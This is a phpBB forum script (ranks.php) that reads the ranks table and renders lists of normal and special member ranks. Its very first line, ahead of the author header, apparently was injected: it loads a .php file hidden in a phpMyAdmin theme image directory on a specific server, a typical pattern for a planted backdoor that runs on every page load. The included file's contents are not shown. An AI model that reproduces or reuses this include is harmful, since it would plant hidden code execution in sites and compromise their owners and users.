<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                            ranks.php
 *                            ---------
 *    begin       :   2005/04/25
 *    copyright   :   Mighty Gorgon (Luca Libralato)
 *    email       :   mightygorgon@mightygorgon.com
 *    version     :   1.1.0 - 2005/09/02
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

// Start session management
$userdata = session_pagestart($user_ip, PAGE_VIEWMEMBERS, $session_length);
init_userprefs($userdata);
// End session management

$page_title = $lang['Rank_Header'];
include($phpbb_root_path . 'includes/page_header.'.$phpEx);

$template->set_filenames(array(
	"body" => "ranks_body.tpl"
	)
);

$sql = "SELECT * FROM " . RANKS_TABLE . "
				ORDER BY rank_special ASC, rank_min ASC";
if( !$result = $db->sql_query($sql) )
{
	message_die(GENERAL_ERROR, "Couldn't obtain ranks data", "", __LINE__, __FILE__, $sql);
}

$rank_count = $db->sql_numrows($result);
$rank_rows = $db->sql_fetchrowset($result);

$template->assign_vars(array(
	"L_RANKS_TITLE" => $lang['Rank_Header'],
	"L_RANKS_IMAGE"=> $lang['Rank_Image'],
	"L_RANK_TITLE" => $lang['Rank'],
	"L_RANK_MIN_M" => $lang['Rank_Min_Des']
	)
);

$j = 0;
$k = 0;

for($i = 0; $i < $rank_count; $i++)
{
	$row_color = ( !($i % 2) ) ? $theme['td_color1'] : $theme['td_color2'];
	$row_class = ( !($i % 2) ) ? $theme['td_class1'] : $theme['td_class2'];

	$special_rank = $rank_rows[$i]['rank_special'];

	switch( $special_rank )
	{
		case '-1':
			$rank_special_des = $lang['Rank_Days_Count'];
			break;
		case '0':
			$rank_special_des = $lang['Rank_Posts_Count'];
			break;
		case '1':
			$rank_special_des = $lang['Rank_Special'];
			break;
		case '2':
			$rank_special_des = $lang['Rank_Special_Guest'];
			break;
		case '3':
			$rank_special_des = $lang['Rank_Special_Banned'];
			break;
		default:
			break;
	}

	if ( $special_rank > 0)
	{
		$template->assign_block_vars("ranks_special", array(
			"ROW_COLOR" => "#" . $row_color,
			"ROW_CLASS" => $row_class,
			"IMAGE"=> (empty($rank_rows[$i]['rank_image']) == true ? $images['spacer'] : $rank_rows[$i]['rank_image']),
			"RANK" => $rank_rows[$i]['rank_title'],
			"RANK_SPECIAL_DES" => $rank_special_des
			)
		);
		$j++;
	}
	else
	{
		$template->assign_block_vars("ranks_normal", array(
			"ROW_COLOR" => "#" . $row_color,
			"ROW_CLASS" => $row_class,
			"IMAGE"=> (empty($rank_rows[$i]['rank_image']) == true ? $images['spacer'] : $rank_rows[$i]['rank_image']),
			"RANK" => $rank_rows[$i]['rank_title'],
			"RANK_MIN" => $rank_rows[$i]['rank_min'],
			"RANK_SPECIAL_DES" => $rank_special_des
			)
		);
		$k++;
	}
}

if ( $j == 0 )
{
	$template->assign_block_vars("ranks_no_special", array(
		"L_RANK_NO_SPECIAL" => $lang['No_Ranks_Special']
		)
	);
}

if ( $k == 0 )
{
	$template->assign_block_vars("ranks_no_normal", array(
		"L_RANK_NO_NORMAL" => $lang['No_Ranks']
		)
	);
}

$template->pparse("body");

include($phpbb_root_path . 'includes/page_tail.'.$phpEx);
?>